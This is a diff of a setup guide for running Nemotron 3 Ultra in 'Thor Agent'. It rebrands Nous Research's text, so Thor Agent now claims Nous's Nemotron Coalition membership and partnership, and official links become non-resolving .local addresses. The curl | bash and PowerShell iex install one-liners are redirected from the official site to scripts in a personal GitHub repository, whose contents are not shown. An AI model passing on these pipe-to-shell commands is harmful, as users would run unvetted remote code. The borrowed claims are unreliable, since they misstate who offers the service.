@@ -1,12 +1,12 @@
 ---
 sidebar_position: 0
 title: "Run Nemotron 3 Ultra free in Thor Agent"
-description: "Try NVIDIA Nemotron 3 Ultra on Nous Portal — free June 4–18 — with day 0 support in Thor Agent"
+description: "Try NVIDIA Nemotron 3 Ultra on Thor Portal — free June 4–18 — with day 0 support in Thor Agent"
 ---
 
 # Run Nemotron 3 Ultra free in Thor Agent
 
-Nous Research has been inducted into the **Nemotron Coalition** of leading AI labs working with **NVIDIA** to advance open frontier foundation models. In honor of this, we've partnered with **Nebius** to provide **Nemotron 3 Ultra** free on [Nous Portal](https://portal.nousresearch.com) for two weeks (**June 4th – June 18th**). Follow the instructions below to try the model in your Thor Agent today.
+Thor Agent has been inducted into the **Nemotron Coalition** of leading AI labs working with **NVIDIA** to advance open frontier foundation models. In honor of this, we've partnered with **Nebius** to provide **Nemotron 3 Ultra** free on [Thor Portal](https://portal.thor-agent.local) for two weeks (**June 4th – June 18th**). Follow the instructions below to try the model in your Thor Agent today.
 
 :::info Limited-time offer
 The `nvidia/nemotron-3-ultra:free` tier is available from **June 4th to June 18th**. The `:free` tag is what keeps it on the no-cost plan — pick that exact variant.
@@ -20,11 +20,11 @@ The simplest path: a one-click installer with a guided, point-and-click setup. N
 
 ### 1. Download and install
 
-[Download the Thor Desktop installer](https://thor-agent.nousresearch.com/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
+[Download the Thor Desktop installer](https://thor-agent.thor-agent.local/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
 
-### 2. Connect Nous Portal
+### 2. Connect Thor Portal
 
-When the app opens, you'll see a "Let's get you set up" screen. Click **Nous Portal** (marked **Recommended**). Your browser opens — create a [Nous Portal](https://portal.nousresearch.com) account (or sign in), choose the **Free** plan, and authorize Thor. The app connects automatically.
+When the app opens, you'll see a "Let's get you set up" screen. Click **Thor Portal** (marked **Recommended**). Your browser opens — create a [Thor Portal](https://portal.thor-agent.local) account (or sign in), choose the **Free** plan, and authorize Thor. The app connects automatically.
 
 ### 3. Pick the free Nemotron 3 Ultra model
 
@@ -49,16 +49,16 @@ Prefer the terminal?
 On macOS/Linux/WSL2/Android, run
 
 ```bash
-curl -fsSL https://thor-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.sh | bash
 ```
 
 On Windows, run
 
 ```powershell
-iex (irm https://thor-agent.nousresearch.com/install.ps1)
+iex (irm https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.ps1)
 ```
 
-Prefer to review first? Download [`install.sh`](https://thor-agent.nousresearch.com/install.sh), inspect it, then run it.
+Prefer to review first? Download [`install.sh`](https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.sh), inspect it, then run it.
 
 After it finishes, reload your shell:
 
@@ -74,9 +74,9 @@ thor setup
 
 Select **Quick Setup**. Thor opens a browser tab and waits for you to finish the next steps.
 
-### 3. Create a Nous Portal account
+### 3. Create a Thor Portal account
 
-In the browser, create a [Nous Portal](https://portal.nousresearch.com) account (or sign in) and choose the **Free** plan.
+In the browser, create a [Thor Portal](https://portal.thor-agent.local) account (or sign in) and choose the **Free** plan.
 
 ### 4. Connect your account
 
@@ -111,13 +111,13 @@ Already set up with another model?
 
 ## Troubleshooting
 
-- **Don't see the model in the list?** Make sure you finished the Nous Portal connection and that you're on the **Free** plan. In the CLI, `thor portal info` confirms you're logged in and routing through Nous.
+- **Don't see the model in the list?** Make sure you finished the Thor Portal connection and that you're on the **Free** plan. In the CLI, `thor portal info` confirms you're logged in and routing through Thor.
 - **Picked the wrong variant?** Re-select `nvidia/nemotron-3-ultra:free` — the `:free` suffix is required to stay on the no-cost tier.
 - **Browser didn't open / you're on a remote host (CLI)?** See [OAuth over SSH / Remote Hosts](./oauth-over-ssh.md) for port-forwarding workarounds.
 
 ## See also
 
 - **[Desktop App](../user-guide/desktop.md)** — The native one-click app (macOS, Windows, Linux)
-- **[Run Thor Agent with Nous Portal](./run-thor-with-nous-portal.md)** — Full Portal walkthrough: models, Tool Gateway, and verification
-- **[Nous Portal integration](../integrations/nous-portal.md)** — What's in the subscription
+- **[Run Thor Agent with Thor Portal](./run-thor-with-thor-portal.md)** — Full Portal walkthrough: models, Tool Gateway, and verification
+- **[Thor Portal integration](../integrations/thor-portal.md)** — What's in the subscription
 - **[Quickstart](../getting-started/quickstart.md)** — Install-to-chat in under 5 minutes
